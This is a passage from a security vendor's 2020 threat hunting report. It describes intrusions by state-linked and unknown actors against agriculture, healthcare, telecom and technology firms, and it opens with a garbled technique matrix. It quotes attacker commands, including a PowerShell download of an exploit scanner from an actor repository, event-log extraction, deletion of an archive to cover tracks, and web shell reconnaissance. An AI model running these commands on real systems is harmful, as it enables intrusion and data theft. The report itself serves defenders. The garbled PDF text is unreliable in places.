PowerShell

Create Account

Exploita3on for Privilege Escala3on

Clear Command History

Creden3al Dumping

Network Service S

Spearphishing via Service

Regsvr32

External Remote Services

New Service

Compile AUer Delivery

Creden3als from Web Browsers

Network Share Dis

Supply Chain Compromise

Rundll32

Hidden Files and Directories

Process Injec3on

Creden3als in Files

Password Policy Di

Trusted Rela3onship

Scheduled Task

Local Job Scheduling

Scheduled Task

Connec3on Proxy
Deobfuscate/Decode Files or
Informa3on

Creden3als in Registry

Permission Groups

Drive-by Compromise

Scrip3ng

Modify Exis3ng Service

Valid Accounts

Disabling Security Tools

Input Capture

Process Discovery

Hardware Addi3ons

Service Execu3on

New Service

Web Shell

DLL Side-Loading

Kerberoas3ng

Query Registry

Replica3on Through Removable Media

User Execu3on

Registry Run Keys / Startup Folder

AppInit DLLs

Private Keys

Remote System Di

Spearphishing Link

Windows Management Instrumenta3on

Scheduled Task

DLL Search Order Hijacking

Exploita3on for Defense Evasion
File and Directory Permissions
Modiﬁca3on

Steal Web Session Cookie

Security SoUware

Component Object Model and
Distributed COM

Valid Accounts

Service Registry Permissions Weakness

File Dele3on

Network Sniﬃng

System Informa3o

Execu3on through API

Web Shell

Setuid and Setgid

Hidden Files and Directories

Exploita3on for Creden3al Access

System Network C

Exploita3on for Client Execu3on

.bash_proﬁle and .bashrc

Sudo

Hidden Window

Forced Authen3ca3on

System Network C

InstallU3l

AppInit DLLs

Image File Execu3on Op3ons Injec3on

Indicator Removal on Host

Hooking

System Owner/Use

Execu3on through Module Load

DLL Search Order Hijacking

AppCert DLLs

Masquerading

Input Prompt

System Service Dis

Mshta

Redundant Access

Applica3on Shimming

Modify Registry

Keychain

System Time Disco

Regsvcs/Regasm

Service Registry Permissions Weakness

Dylib Hijacking

Network Share Connec3on Removal

LLMNR/NBT-NS Poisoning and Relay

Network Sniﬃng

Third-party SoUware

Elevated Execu3on with Prompt

Obfuscated Files or Informa3on

Password Filter DLL

Peripheral Device

Trusted Developer U3li3es

Setuid and Setgid
Windows Management Instrumenta3on
Event Subscrip3on

Emond

Process Hollowing

Securityd Memory

SoUware Discover

AppleScript

Image File Execu3on Op3ons Injec3on

Extra Window Memory Injec3on

Process Injec3on

Two-Factor Authen3ca3on Intercep3on

Applica3on Windo

CMSTP

Netsh Helper DLL

File System Permissions Weakness

Regsvr32

Browser Bookmark

Compiled HTML File

Screensaver

Hooking

Rundll32

Virtualiza3on/Sand

Control Panel Items

AppCert DLLs

Launch Daemon

Scrip3ng

Dynamic Data Exchange

Applica3on Shimming

Parent PID Spooﬁng

Timestomp

Launchctl

Authen3ca3on Package

Path Intercep3on

Valid Accounts

LSASS Driver

Bootkit

Plist Modiﬁca3on

Code Signing

Signed Binary Proxy Execu3on

Browser Extensions

Port Monitors

DLL Search Order Hijacking

Signed Script Proxy Execu3on

Change Default File Associa3on

PowerShell Proﬁle

HISTCONTROL

Source

Component Firmware

SID-History Injec3on

Indicator Removal from Tools

Space aUer Filename

Component Object Model Hijacking

Startup Items

InstallU3l

Trap

Dylib Hijacking

Sudo Caching

Redundant Access

Windows Remote Management

Emond

Rootkit

XSL Script Processing

File System Permissions Weakness

Template Injec3on

Hooking

Web Service

Hypervisor

Group Policy Modiﬁca3on

Kernel Modules and Extensions

Hidden Users

Launch Agent

Image File Execu3on Op3ons Injec3on

Launch Daemon

Mshta

Launchctl

NTFS File AMributes

LC_LOAD_DYLIB Addi3on

Regsvcs/Regasm

Login Item

SoUware Packing

Logon Scripts

Trusted Developer U3li3es

LSASS Driver

Binary Padding

Oﬃce Applica3on Startup

CMSTP

Path Intercep3on

Compiled HTML File

Plist Modiﬁca3on

Component Firmware

Port Knocking

Component Object Model Hijacking

Port Monitors

Control Panel Items

PowerShell Proﬁle

DCShadow

Rc.common

Execu3on Guardrails

Re-opened Applica3ons

Extra Window Memory Injec3on

Security Support Provider

File System Logical Oﬀsets

Server SoUware Component

Gatekeeper Bypass

Shortcut Modiﬁca3on

Indicator Blocking

SIP and Trust Provider Hijacking

Indirect Command Execu3on

Startup Items

Install Root Cer3ﬁcate

System Firmware

Launchctl

Systemd Service

LC_MAIN Hijacking

Time Providers

Parent PID Spooﬁng

Trap

Plist Modiﬁca3on

Winlogon Helper DLL

Port Knocking
Process Doppelgänging
Signed Binary Proxy Execu3on
Signed Script Proxy Execu3on

eCrime only
State-sponsored only
Both

SIP and Trust Provider Hijacking
Space aUer Filename
Virtualiza3on/Sandbox Evasion
XSL Script Processing

owsers

e

al Access

g and Relay

on Intercep3on

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

22

Discovery

Lateral Movement

Collec$on

Command And Control

Exﬁltra$on

Impact

Account Discovery

Remote Desktop Protocol

Data from Informa3on Repositories

Commonly Used Port

Data Compressed

Service Stop

Domain Trust Discovery

Remote File Copy

Data from Local System

Connec3on Proxy

Data Encrypted

System Shutdown/Reboot

File and Directory Discovery

Remote Services

Data from Network Shared Drive

Custom Command and Control Protocol

Run3me Data Manipula3on

Network Service Scanning

Windows Admin Shares

Data Staged

Data Obfusca3on

Exﬁltra3on Over Alterna3ve Protocol
Exﬁltra3on Over Command and Control
Channel

Network Share Discovery

Component Object Model and
Distributed COM

Input Capture

Remote Access Tools

Automated Exﬁltra3on

Inhibit System Recovery

Password Policy Discovery

Pass the Hash

Screen Capture

Remote File Copy

Resource Hijacking

Permission Groups Discovery

Third-party SoUware

Automated Collec3on

Standard Applica3on Layer Protocol

Data Transfer Size Limits
Exﬁltra3on Over Other Network
Medium

Process Discovery

AppleScript

Clipboard Data

Standard Cryptographic Protocol

Exﬁltra3on Over Physical Medium

Data Destruc3on

Query Registry

Applica3on Deployment SoUware

Audio Capture

Uncommonly Used Port

Scheduled Transfer

Defacement

Remote System Discovery

Exploita3on of Remote Services

Data from Removable Media

Data Encoding

Disk Content Wipe

Security SoUware Discovery

Internal Spearphishing

Email Collec3on

Standard Non-Applica3on Layer Protocol

Disk Structure Wipe

System Informa3on Discovery

Logon Scripts

Man in the Browser

Web Service

Endpoint Denial of Service

Video Capture

Communica3on Through Removable
Media

Firmware Corrup3on

System Network Conﬁgura3on Discovery Pass the Ticket

Data Encrypted for Impact

Account Access Removal

System Network Connec3ons Discovery

Replica3on Through Removable Media

Custom Cryptographic Protocol

Network Denial of Service

System Owner/User Discovery

Shared Webroot

Domain Fron3ng

Stored Data Manipula3on

System Service Discovery

SSH Hijacking

Domain Genera3on Algorithms

TransmiMed Data Manipula3on

System Time Discovery

Taint Shared Content

Fallback Channels

Network Sniﬃng

Windows Remote Management

Mul3-hop Proxy

Peripheral Device Discovery

Mul3-Stage Channels

SoUware Discovery

Mul3band Communica3on

Applica3on Window Discovery

Mul3layer Encryp3on

Browser Bookmark Discovery

Port Knocking

Virtualiza3on/Sandbox Evasion

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

23

INTRUSION HIGHLIGHTS
HUNTING THWARTS LABYRINTH CHOLLIMA ATTACK
LAUNCHED OVER SOCIAL MEDIA
OVERVIEW
In June 2020, OverWatch hunting uncovered a notable attack against a North American
agriculture company. A phishing lure led to installation of a malicious loader, which
provided access for a hands-on operator to perform various discovery commands on
the target system. While the agriculture sector has had its share of eCrime intrusions,
state-sponsored adversaries have also turned their attention to this industry. In
this case, CrowdStrike Intelligence attributed the activity to the North Korea-based
adversary group LABYRINTH CHOLLIMA.

INITIAL ACCESS

Phishing lure
delivered

INITIAL ACCESS

EXECUTION, DEFENSE EVASION

User opened
weaponized doc that
used various
techniques to retrive
and execute
NedDnLoader

EXECUTION

Malicious activity
identified beneath
exploited Apache
web process

PERSISTENCE

DISCOVERY

NedDnLoader
attempted to
connect to actor
C2 to retrive
secondary
payload

Actor performed
various discovery
actions and
attempted to stage
files for collection

COMMAND
& CONTROL

DEFENSE EVASION

Preexisting web
shell used to
execute basic host
reconnaisance
commands on host

PowerShell launched to
retrieve malicious file from
actor-controlled GitHub
repository

COMMAND & CONTROL

EXFILTRATION

Actor implant resolving
GitHub API domain and
using the service for
covert C2
communications

Actor implant discovered
on host masquerading as
Microsoft Service Host
process

User logon events of
interest extracted,
archived and
exfiltrated, after
which archive file is
deleted

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

24

UNUSUAL COMMAND ALERTS THREAT HUNTERS TO MALICIOUS ACTIVITY
OverWatch identified suspicious behavior within this agriculture company’s network
when an unusual rundll32.exe command was executed under a Microsoft
Word process. A suspicious dynamic link library (DLL) file named desktop.dat,
masquerading as a .dat file, was loaded into memory in an unusual manner. Shortly
thereafter, OverWatch hunters observed several interactive command shells spawned
under the rundll32.exe process responsible for executing the DLL.
Figure 13: Example process tree of a cmd.exe shell spawned under the suspicious
rundll32.exe process

WINLOGON.EXE
USERINIT.EXE
EXPLORER.EXE
CHROME.EXE
WINWORD.EXE
RUNDLL32.EXE
CMD.EXE

These cmd shells were used to execute a range of discovery commands to gather
network, host and account information. For example:
•

WININIT.EXE

ipconfig /all

•

net use

•

ping -n 1 -a <REDACTED HOSTNAME>

•

HTTPD.EXE
ping -n 1 <REDACTED HOSTNAME>

•

cmd.exe /c time /t

•

netstat -ano

•

reg query "HKEY_USERS\[REDACTED SID]\Software\Microsoft\
Windows\CurrentVersion\Internet Settings"CMD.EXE

•

net localgroup administrators

•

net group "domain admins" /domain

•

sc query

SERVICES.EXE

CMD.EXE

HTTPD.EXE

CMD.EXE

OverWatch immediately notified the customer of the potentially malicious behavior
via Falcon console detections and provided a detailed written report. With the victim
equipped to take defensive action, OverWatch threat hunters then continued in their
investigation.

SVCHOST.EXE

CMD.EXE
SVCHOST.EXE
CMD.EXE

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

25

UNSOLICITED JOB OPPORTUNITY PROVES TO BE TOO GOOD TO BE TRUE
Further analysis of the attack, in tandem with the CrowdStrike Intelligence team,
uncovered evidence that the attack began when a user unwittingly opened a
weaponized Microsoft Word document. The adversary, posing as a job recruiter, used
various social media channels and applications to facilitate delivery of the phishing
lure. When opened, the file downloaded a macro-enabled document hosted at a
malicious URL. The macro-enabled document was then downloaded as an embedded
template. The downloaded template file contained a macro that, when executed,
extracted a double Base64-encoded payload saved to the path
C:\ProgramData\desktop.dat. This was the DLL file disguised as a .dat file that
caught OverWatch’s attention, as noted previously. The DLL exports many functions
composed mainly of Perl Compatible Regular Expressions (PCRE) library functions
in an attempt to masquerade the DLL as a benign file. But the DLL also decrypted a
copy of a payload that CrowdStrike Intelligence refers to as “NedDnLoader,” which
was then loaded directly into memory. Abusing rundll32.exe to execute DLLs puts
network defenders in a difficult position when relying on security technologies alone.
Rather than configuring the endpoint security platform to block rundll32.exe,
and potentially causing impact to normal network operations, defenders can employ
effective threat hunting to serve as the backstop to identify such living-off-the-land
techniques.
The NedDnLoader payload then attempted to contact a command and control (C2)
server to retrieve a second-stage payload from the following URL:
https[:]//www.paghera[.]com/include/inc-main-default-news.asp.
In addition to loading the NedDnLoader payload, the macro displayed a spoofed
English-language decoy job description for a Senior Manager position on the finance
team at a legitimate entertainment company.
This enabled the adversary to achieve interactive access to the compromised host
and perform the initial discovery actions mentioned previously. During this time, they
also created a new directory on the system, masquerading as a legitimate Windows
directory, and used xcopy to copy folders and files over to the new directory,
potentially as staging for later exfiltration:
xcopy /S /C /E C:\ProgramData\Microsoft\Windows\*.*
C:\ProgramData\Windows

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

26

CONCLUSIONS AND RECOMMENDATIONS
Thanks to OverWatch’s rapid identification and communication of the attack, the
customer was able to network contain the machine to stop the adversary and prevent
any significant impact. Subsequent investigation found that the adversary had used a
falsified profile on one social media channel to initiate contact with the victim, and then
used that relationship to deceive the victim into opening the malicious file when it was
delivered via a separate messaging application. This serves as an important reminder
for defenders to continuously evaluate the appropriate level of filtering for web-based
content for their users. In many cases, restricting access to sites like social media
platforms would reduce the attack surface available to adversaries. In addition, users
should be regularly reminded and trained in identifying social engineering techniques.
CrowdStrike Intelligence assesses with high confidence that this operation is
attributable to LABYRINTH CHOLLIMA based on the deployment of NedDnLoader
— malware exclusive to this adversary — as well as the use of job description lure
documents (a frequent LABYRINTH CHOLLIMA tactic). Also worth highlighting is
that the decoy content initially appears to be tailored to media or financial sector
entities and does not appear specific to the agriculture industry. While this targeting
could be indicative of economic espionage targeting the agricultural sector — a
vertical highlighted for aggressive economic development by Kim Jong-un in his 2016
National Economic Development Strategy (NEDS) — LABYRINTH CHOLLIMA is also
known to use compromised infrastructure in its campaigns. It is equally likely that the
unfocused nature of the decoy document could be a generic lure used by LABYRINTH
CHOLLIMA to obtain access to the targeted customer’s infrastructure, which would
subsequently be leveraged by LABYRINTH CHOLLIMA as C2 or to host secondary
payloads in follow-on operations.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

27

PANDA ABUSES GITHUB SERVICE FOR COVERT C2
OVERVIEW
In June 2020, Falcon OverWatch uncovered targeted intrusion activity against an
organization operating within the healthcare industry in the Asia-Pacific region. The
preexisting intrusion predated the organization’s deployment of the Falcon sensor and
involved the use of a number of interesting TTPs to support the actor’s actions on
objectives, which included information-gathering operations and establishing persistent
access. The malicious activity shared a strong overlap with TTPs previously observed in
targeted intrusions against healthcare organizations throughout Southeast Asia, and the
TTPs observed are consistent with China-based adversaries.
Initial malicious activity included the attempted execution of China Chopper — a web
shell commonly used by China-nexus threat actors — beneath a likely exploited Apache
EXECUTION, DEFENSE EVASION
COMMAND & CONTROL
INITIAL ACCESS
DISCOVERY
web server process on a Windows-based host, along with the use of PowerShell to
download and retrieve a malicious executable. Particularly noteworthy was the actor’s
use of a novel Python-based remote access tool (RAT) masquerading as a legitimate
Windows system process that leverages a public GitHub repository for covert C2
communications. A second actor-controlled GitHub repository was also identified being
used to stage a selection of malicious tooling and password-protected .zip archives,
which included two variants of an EternalBlue exploit scanner. Also notable was the
Phishing
lure
User opened extraction of
NedDnLoader
Actor performed
actor’s
querying
and subsequent
user logon events from
the security
delivered
weaponized doc that
attempted to
various discovery
event log on a likely Windows
domain
controller,
in
which
the
command
line
used various
connect to actor
actions
andutility
techniques
to
retrive
C2
to
retrive
attempted
to
stage of
wevtutil.exe was used to display events associated with a single user account
and execute
secondary
files for collection
interest, before exporting
and archiving the events
in preparation for likely exfiltration.
NedDnLoader
payload

INITIAL ACCESS

EXECUTION

Malicious activity
identified beneath
exploited Apache
web process

PERSISTENCE

Preexisting web
shell used to
execute basic host
reconnaisance
commands on host

PowerShell launched to
retrieve malicious file from
actor-controlled GitHub
repository

INITIAL ACCESS

EXECUTION

COMMAND
& CONTROL

DEFENSE EVASION

Actor implant resolving
GitHub API domain and
using the service for
covert C2
communications

Actor implant discovered
on host masquerading as
Microsoft Service Host
process

PERSISTENCE

EXFILTRATION

CREDENTIAL ACCESS LATERAL MOVEMENT

User logon events of
interest extracted,
archived and
exfiltrated, after
which archive file is
deleted

COLLECTION

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

28

ATTEMPTED CHOPPER WEB SHELL EXECUTION BENEATH APACHE WEB PROCESS
WINLOGON.EXE

As part of this preexisting intrusion, Falcon OverWatch identified attempts by the actor
USERINIT.EXE
to execute the China Chopper web shell beneath the likely exploited Apache web
server process httpd.exe. EXPLORER.EXE
Operating as the local system user, the actor attempted
to use the web shell to gather system information
through the execution of basic host
CHROME.EXE
reconnaissance commands.
WINWORD.EXE

Example:

RUNDLL32.EXE
CMD.EXE

cmd.exe /c "cmd /c "cd /d "C:/www/[REDACTED]/[REDACTED]/system/
core"&whoami&echo [S]&cd&echo [E]" 2>&1"

Figure 14: Example process tree showing likely compromised httpd.exe spawning
multiple command shells

WININIT.EXE

SERVICES.EXE

HTTPD.EXE
CMD.EXE

HTTPD.EXE

CMD.EXE

CMD.EXE

In this case, the actor’s attempts to execute the China Chopper web shell were thwarted
by the Falcon sensor and were ultimately unsuccessful.

PYTHON RAT LEVERAGES GITHUB FOR COVERT C2
Further investigation into the actor’s activity by OverWatch threat hunters uncovered
the existence of a preexisting implant binary in the C:\Windows directory on a
CMD.EXE
host. TheSVCHOST.EXE
binary was masquerading as the Microsoft shared service
host process
svchost.exe in an attempt to evade detection and bypass security controls. Analysis
SVCHOST.EXE
of the implant, dubbed “BackGitHub” by CrowdStrike Intelligence, revealed that the
CMD.EXE
binary was in fact a PyInstaller executable containing a novel Python-based RAT.
Notably, the implant binary was found to be resolving the domain api.github.com
POWERSHELL.EXE
and had the capability to execute arbitrary commands via API, using an actor-controlled
GitHub repository for covert C2 communications.
CMD.EXE

Also notably, further analysis of the GitHub repository revealed a list of both the
implant commands executed by the actor, and the responses to commands and
beacons. The commands were reflective of SYSTEMINFO.EXE
basic host reconnaissance operations and
included enumeration of both directories and group memberships of interest.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

29

WINLOGON.EXE
USERINIT.EXE
EXPLORER.EXE
CHROME.EXE
WINWORD.EXE

Reconnaissance command execution examples:

RUNDLL32.EXE
CMD.EXE

dir c:\users\public\
systeminfo
ping -a -n 1 [REDACTED]
ipconfig /all
whoami
net user /domain

ALTERNATE GITHUB REPOSITORY USED TO STAGE MALICIOUS TOOLING
WININIT.EXE

SERVICES.EXE
Continuing to operate
via the implant svchost.exe, the actor attempted to launch
PowerShell to download the malicious binary ms.exe from a second actor-controlled
HTTPD.EXE
public GitHub repository. The specific binary in question was later identified by
CMD.EXE
HTTPD.EXE
CrowdStrike Intelligence as an EternalBlue exploit scanning
tool, commonly deployed
by adversaries in an attempt to locate hosts that remain vulnerable to the Windows
CMD.EXE
SMBv1 remote code execution vulnerability CVE-2017-0143.

CMD.EXE

Command line example:

powershell (new-object System.Net.WebClient).
DownloadFile('hXXps://github[.]com/[REDACTED]/test/raw/master/
ms.exe','c:\\users\\public\\2.exe')

Figure 15: Example process tree shows PowerShell launched via cmd.exe beneath actor
implant svchost.exe

SVCHOST.EXE

CMD.EXE
SVCHOST.EXE
CMD.EXE

POWERSHELL.EXE

CMD.EXE

SYSTEMINFO.EXE

Further examination of this second GitHub repository by OverWatch revealed it was
being used by the actor as a staging resource and contained a selection of malicious
executables and open source penetration-testing tools, including a second variant
of the EternalBlue scanner, a shellcode loader and a tunneling utility used to subvert
firewalls. Additionally, multiple password-protected .zip archive files were also
discovered.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

30

EXTRACTION AND ARCHIVAL OF USER LOGON EVENTS FROM THE SECURITY EVENT LOG
Continuing their actions on objectives, the actor was later observed conducting
information-gathering operations on a second Windows host, likely serving as a
domain controller, in the form of targeted log event extraction and subsequent
compression. The activity occurred beneath the likely exploited Microsoft Spooler
SubSystem app spoolsv.exe and was conducted via a Remote Desktop Protocol (RDP)
session, which was initiated from a remote internal host, without the Falcon sensor
installed, using likely compromised administrative credentials.
Figure 16: Example process tree shows multiple actor command prompts launched beneath
the exploited spoolsv.exe service used to execute Microsoft utilities makecab.exe and
wevtutil.exe
WININIT.EXE
SERVICES.EXE
CMD.EXE
SPOOLSV.EXE
CMD.EXE

MAKECAB.EXE

CMD.EXE

WEVTUTIL.EXE

The actor launched the Microsoft Windows utility wevtutil.exe with the ‘qe’ flag
to query events of interest in the Windows security log.
C:\Windows\system32\cmd.exe /C wevtutil qe security /format:text
/q:"Event[System[(EventID=4624) and TimeCreated[timediff(@
SystemTime) <= 432000000]] and EventData[Data[@
Name='TargetUserName']='[REDACTED]']]" > [REDACTED].txt
WININIT.EXE

SERVICES.EXE
The specific command
execution in this case is notable and indicates that the actor
was focused strictly on user SVCHOST.EXE
logon events (Event ID 4624) associated with one
POWERSHELL.EXE
WMIPRVSE.EXE
particular user account of interest from the
preceding 12 hours.
RUNDLL32.EXE

The actor then ran wevtutil.exe again, this time with the ‘epl’ flag to export all
POWERSHELL.EXE
user logon events from the preceding 12 hours to an .evtx output file.
EVENTS.EXE

wevtutil epl Security C:\system~1\[REDACTED].evtx
/q:"*[System[(EventID=4624) and TimeCreated[timediff(@SystemTime)
<= 43200000]]]"
From here, the actor used the makecab utility to compress the .evtx output file into
a .zip archive in preparation for likely exfiltration, after which the actor deleted the
archive file in an attempt to cover their tracks.
C:\Windows\system32\cmd.exe /C del [REDACTED}.evtx.zip [REDACTED].
evtx log.txt

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

31

CONCLUSIONS AND RECOMMENDATIONS
Recent global events continue to position the healthcare industry firmly in the
crosshairs as a rich target for threat actors. Despite the preexisting nature of this
intrusion, OverWatch’s human-led continuous threat hunting allowed for the prompt
discovery and notification of the malicious activity described, enabling the victim
organization to quickly respond by containing the adversary and commencing
remediation activities. The TTPs deployed as part of this intrusion serve as a timely
reminder of the importance of getting the fundamentals right with respect to basic
security hygiene, including effective patch management. The increasing use of
techniques like masquerading as a means to conceal malicious binary execution
warrants defenders considering countermeasures such as allowlisting to help restrict
program execution based on non-name-based file attributes. Furthermore, the use of
web proxies and other controls should be evaluated to assist in filtering web traffic
and to help mitigate against adversary use of legitimate web services such as GitHub
to facilitate and conceal C2 communications.

2020 THREAT HUNTING REPORT
INITIAL ACCESS
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH
TEAM

EXECUTION

Malicious activity
identified beneath
exploited Apache
web process

PERSISTENCE

COMMAND
& CONTROL

DEFENSE EVASION

Preexisting web
shell used to
execute basic host
reconnaisance
commands on host

EXFILTRATION32

Actor implant resolving
GitHub API domain and
using the service for
covert C2
communications

TRACER KITTEN EXPLOITS CUSTOM BACKDOORS
TO BREACH A TELECOMMUNICATIONS COMPANY
PowerShell launched to

Actor implant discovered
on host masquerading as
Microsoft Service Host
process

User logon events of
interest extracted,
archived and
repository
exfiltrated, after
In April 2020, OverWatch discovered Iran-based adversary TRACER which archive file is
KITTEN conducting malicious interactive activity against multiple hosts at adeleted
malicious file from
OVERVIEW retrieve
actor-controlled GitHub

telecommunications company in the Europe, Middle East and Africa (EMEA) region.
The actor was found operating under valid user accounts, using custom backdoors
in combination with SSH tunnels for C2. The adversary leveraged their foothold to
conduct a variety of reconnaissance activities, undertake credential harvesting and
prepare for data exfiltration.
Telecommunications is currently the third most frequently targeted vertical. This
industry still remains firmly within the crosshairs for targeted attacks, the motivations
of which are likely associated with espionage and data theft objectives.

EXECUTION

INITIAL ACCESS

Valid accounts
compromised to
gain foothold

CREDENTIAL ACCESS LATERAL MOVEMENT

PERSISTENCE

Custom code
deployed to install
backdoors and
configure rogue
services

Falcon sensor blocked
attempts to utilize
PowerShell, Command
Prompt and WMIC to
perform reconnaissance

COLLECTION

Masquerading
performed on a
legitimate Bitvise SSH
client and subsequently
used to move laterally

Various techniques
leveraged to exploit
LSASS, including the
use of comsvcs.dll

PowerShell tool
Invoke-TheHash
executed to gather and
move files between
mapped shares

UNUSUAL ACTIVITY LEADS TO DISCOVERY OF LEGITIMATE SSH CLIENT BEING USED FOR
LATERAL MOVEMENT
The key tactics performed by this adversary highlight various advanced hands-onkeyboard techniques, which can be extremely difficult to detect and distinguish from
normal traffic patterns. The adversary leveraged valid account credentials from an
unknown source to gain an initial foothold within the environment.
Proactive threat hunting uncovered a masquerading technique being used, which
led to the discovery and reporting of further malicious hands-on-keyboard activity.
In this instance, the adversary observed that an SSH tool called Bitvise was installed
on the system, and proceeded to take a copy of this and rename it within an Adobe
directory to appear associated with the Adobe program. This application was then
used to move laterally through the network and gain additional access, which led to
OverWatch discovering the activity due to the program executing via an anomalous
process path.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

33

ADVERSARY BACKDOORS MASQUERADE AS LEGITIMATE SERVICES
OverWatch discovered various custom binaries being installed onto multiple machines
within the environment. These binaries were attempting to evade detection by registering
as a Windows service named “Windows Video Service.” Following analysis, it was
determined that these files were being used as implants and could have allowed for
exfiltration, but due to timely discovery and notification, the customer was able to perform
network containment before the actor was able to steal any data. The files shown below
are the implants that were responsible for creating the rogue Windows services.
C:\Program Files (x86)\Common Files\Microsoft Shared\Source
Engine\OSE.EXE
C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe
The malware implants employed by the attacker were previously unidentified, but
reverse-engineering
efforts have now identified that DNS (TXT record) tunneling was
WININIT.EXE
coded in as the C2 mechanism,
along with modified Base64 and encryption using
SERVICES.EXE
the CryptoPP library. This functionality allows for several obfuscated commands to
CMD.EXE
be passed to the implant, some of whichSPOOLSV.EXE
allow for executing shell commands and the
reading and writing of files.
CMD.EXE

ADVERSARY LEVERAGES NATIVE TOOLS IN CREDENTIAL HARVESTING ATTEMPT

MAKECAB.EXE

Hunting efforts identified an atypical living-off-the-land technique being employed
to exploit the LSASS process via theCMD.EXE
use of comsvcs.dll. This application is built
into Windows and is an example of tradecraft used by sophisticated adversaries.
WEVTUTIL.EXE
This DLL file contains an exported function called MiniDump,
which can be called via
rundll32.exe to create a memory dump of a given process. Figure 17 highlights
the process chain that resulted from the adversary’s use of this technique. First,
PowerShell was leveraged to execute a Base64-encoded command line argument.
The command line executed rundll32.exe and called the comsvcs.dll function
MiniDump to export the contents of the LSASS process into an output file.
Figure 17: Example process tree of Comsvcs.dll being called via PowerShell and Rundll32

WININIT.EXE

SERVICES.EXE
SVCHOST.EXE
WMIPRVSE.EXE

POWERSHELL.EXE

RUNDLL32.EXE

POWERSHELL.EXE

EVENTS.EXE

Further efforts used by the adversary to perform credential harvesting included a
custom version of Mimikatz being copied across to the system, and Task Manager
being used to dump the LSASS process to disk. However, both of these attempts
were thwarted by the Falcon sensor.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

34

ADVERSARY TAKES ADVANTAGE OF TERMINAL SERVICES TO PERFORM
RECONNAISSANCE AND ATTEMPT C2 BEACONING
Various utilities were used to execute extensive fingerprinting of the environment,
collect user and group information, enumerate services and perform network
reconnaissance. Some of these tools included PowerShell, CMD command line
interpreter and the WMIC utility.
The adversary pivoted laterally using SSH, gained access to a domain controller and
also accessed internally mapped shares. From here, data was caught being moved
between shares, as seen in the following commands.
net use \\[REDACTED]\c$ /user:"[REDACTED]\Administrator"
"<redacted>";
dir C:\Programdata\Emc >> \\[REDACTED]\c$\Programdata\Dc.log;
C:\Programdata\Emc\Emc.exe [REDACTED] >> \\[REDACTED]\c$\
Programdata\Dc.log;
Then, the adversary attempted to run Invoke-TheHash, an application used to perform
pass-the-hash attacks. The Falcon sensor successfully blocked this activity and
prevented communication beacons outbound to the attacker’s infrastructure through
continued use of the Bitvise application.

CONCLUSIONS AND RECOMMENDATIONS
The TTPs used by TRACER KITTEN during this intrusion speak to the importance
of human-driven threat hunting and highlight the challenges of relying exclusively on
technology-based controls. OverWatch was able to work with the affected customer
to provide detailed and timely advice to enable them to contain and expel the
adversary from their network and prevent any significant impact from the attack.
During this intrusion, OverWatch identified novel techniques to exploit LSASS via the
use of the Windows built-in comsvcs.dll utility. Traditional reactive monitoring would
not alert to activity of this nature, and it is therefore important to understand what
“normal” looks like within your environment. Threat hunting is highly recommended, as
it is an effective approach to identifying anomalous activity such as this.
Furthermore, it is recommended that authentication logs are monitored to identify any
potential rogue use of SSH or possible password spraying of user account credentials.
An existing installation of a legitimate SSH client was used to move laterally by the
attacker; CrowdStrike therefore recommends that only business-critical applications
are installed on hosts and that all software adheres to the latest updates and security
patches.
This intrusion highlighted the control of valid accounts, and CrowdStrike therefore
advocates monitoring logs for any new domain accounts and also monitoring any
accounts that have new administrator-level privileges assigned to them. Monitoring
new service additions can also be of benefit, but context is required — human analysts
were essential in the discovery of the malicious artifacts within this customer’s
environment.

2020 THREAT HUNTING REPORT
INSIGHTS FROM THE CROWDSTRIKE OVERWATCH TEAM

35

BACKDOORED SSH SERVICE USED TO COLLECT
CREDENTIALS FROM A TECHNOLOGY COMPANY
OVERVIEW
OverWatch uncovered an intrusion during April 2020 against a technology company
in the Asia-Pacific region in which an unknown actor compromised a Linux server and
installed a backdoored version of the SSH service. The malicious SSH service allowed
the actor access to the host via a magic password and collected credentials of the
existing users as they authenticated to the host. This intrusion provided information
about the workflow of the actor and insights into their possible next steps. While the
intrusion itself appears to be opportunistic in nature, the actor went to great lengths
to install the malicious SSH service and evade detection. The actor likely planned to
return later to collect credentials and conduct additional actions on the host.

INITIAL ACCESS

DISCOVERY

PERSISTENCE

CREDENTIAL ACCESS

DEFENSE EVASION

Exploitation of
an unknown
service

Actor looked for
native tools
capable of
compiling
source code

Actor modified
an existing SSH
with a patch to
enable malicious
functionality

Modified SSHD
captured
credentials on
the host, staging
for later
exfiltration

Actor altered
the new SSH
source code to
mimic the
existing version
and removed log
file entries

WATCHING FOR BURSTS OF ACTIVITY
This intrusion highlights two important practices that are paramount to any
organization’s security. The first is prioritizing basic IT hygiene to reduce the likelihood
of avoidable intrusions. In this case, the actor achieved initial access through the
compromise of an unpatched externally available service. The second important
practice is continuous threat hunting in your environment to discover and disrupt
attacks such as this. The actor in question did not use known malicious tools to
establish persistence and credential-harvesting capabilities on this host. Instead,
they used legitimate source code for the SSH service and applied a patch to enable
the malicious capabilities. OverWatch discovered this activity by watching for
unusual chains of commands being run in a narrow time window. In this case, the
INITIAL ACCESS
LATERAL MOVEMENT
DEFENSE EVASION
CREDENTIAL ACCESS
combination of code being compiled and the use of the touch command — used to
modify timestamps — alerted threat hunters to potentially malicious activity. They
then notified the victim, enabling the organization to remove the intruder from the host
before credentials were compromised or further activity occurred on the host.

